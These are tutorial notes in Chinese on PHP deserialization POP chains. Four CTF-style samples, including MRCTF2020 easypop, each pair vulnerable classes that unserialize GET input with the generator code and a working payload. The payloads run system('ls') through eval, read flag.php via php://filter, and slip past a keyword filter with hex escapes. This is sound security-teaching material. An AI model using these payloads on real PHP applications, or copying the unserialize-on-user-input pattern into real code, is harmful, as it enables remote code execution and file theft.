## POP链

### 样例1

```php
<?php
highlight_file(__FILE__);
class DemoA{
    public $a;
    function __construct(){
        $this->a=new DemoB();
    }
    function __destruct(){
        $this->a->func();
    }
}
class DemoB{
    function func(){
        echo "hacker"."<br>";
    }
}
class DemoC{
    private $a;
    function func(){
        eval($this->a);
    }
}
unserialize($_GET['a']);
?>
```

payload`a=O:5:"DemoA":1:{s:1:"a";O:5:"DemoC":1:{s:8:"%00DemoC%00a";s:13:"system("ls");";}}`

注意DemoC中的$a为private变量要表示为`%00DemoC%00a`

### 样例2

```php
<?php
highlight_file(__FILE__);
class DemoA{
    public $a;
    public function __destruct(){
        $this->a->func();
    }
}
class DemoB{
    public $a;
    public function func(){
        $this->a->func();
    }
}
class DemoC{
    public $a;
    public function __call($tmp1,$tmp2){
        $b=$this->a;
        $b();
    }
}
class DemoD{
    public $a;
    public $b;
    public function __invoke(){
        $this->a="Come on,".$this->b;
        echo $this->a;
    }
}
class DemoE{
    public $a;
    public function __toString(){
        $this->a->flag();
        return "very close!!!";
    }
}
class getflag{
    public function flag(){
        echo "flag{xxx}";
    }
}
unserialize($_GET['a']);
?>
```

```php
<?php
class DemoA{
    public $a;
}
class DemoB{
    public $a;
}
class DemoC{
    public $a;
}
class DemoD{
    public $b;
}
class DemoE{
    public $a;
}
class getflag{
}
$a=new DemoA();
$b=new DemoB();
$c=new DemoC();
$d=new DemoD();
$e=new DemoE();
$flag=new getflag();
$a->a=$b;
$b->a=$c;
$c->a=$d;
$d->b=$e;
$e->a=$flag;
echo serialize($a);
?>
```

payload`O:5:"DemoA":1:{s:1:"a";O:5:"DemoB":1:{s:1:"a";O:5:"DemoC":1:{s:1:"a";O:5:"DemoD":1:{s:1:"b";O:5:"DemoE":1:{s:1:"a";O:7:"getflag":0:{}}}}}}`

### 样例3

MRCTF2020 easypop

```php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;//php://filter/read=convert.base64-encode/resource=flag.php
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;//Show()
    public $str;//Test()
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;//Test::__get()
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {//$this->source=Show(),在preg_match时调用__toString
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;//Modifier()
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;//Modifier::__invoke()
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```

```php
<?php
class Modifier {
    protected $var='php://filter/read=convert.base64-encode/resource=flag.php';
}
class Show{
    public $source;
    public $str;
}
class Test{
    public $p;
}
$show1=new Show();
$show2=new Show();
$test=new Test();
$modifier=new Modifier();
$show1->str=$test;
$test->p=$modifier;
$show2->source=$show1;
var_dump(serialize($show2));
?>
```

payload`?pop=O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";N;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:"%00*%00var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}s:3:"str";N;}`

注意Modifier中的$var为protected变量要表示为`%00*%00var`

### 样例4

```php
<?php
class MyFile {
    public $name;
    public $user;
    public function __construct($name, $user) {
        $this->name = $name;
        $this->user = $user; 
    }
    public function __toString(){
        return file_get_contents($this->name);
    }
    public function __wakeup(){
        if(stristr($this->name, "flag")!==False) 
            $this->name = "/etc/hostname";
        else
            $this->name = "/etc/passwd"; 
        if(isset($_GET['user'])) {
            $this->user = $_GET['user']; //user可控,但name不可控,通过&使name取user的值,进而达到控制name的目的
        }
    }
    public function __destruct() {
        echo $this; //__toString
    }
}
if(isset($_GET['input'])){
    $input = $_GET['input']; 
    if(stristr($input, 'user')!==False){//$input中不能出现user,在反序列化时用大写的S替换小写的s即可用16进制表示user,进而绕过限制
        die('Hacker'); 
    } else {
        unserialize($input);
    }
}else { 
    highlight_file(__FILE__);
}
```

```php
<?php
class MyFile {
    public $name='flag';
    public $user='';
}
$a=new MyFile();
$a->name=&$a->user;
var_dump(serialize($a));
?>
```

payload`?input=O:6:"MyFile":2:{s:4:"name";s:0:"";S:4:"\75ser";R:2;}&user=php://filter/read=convert.base64-encode/resource=flag.php`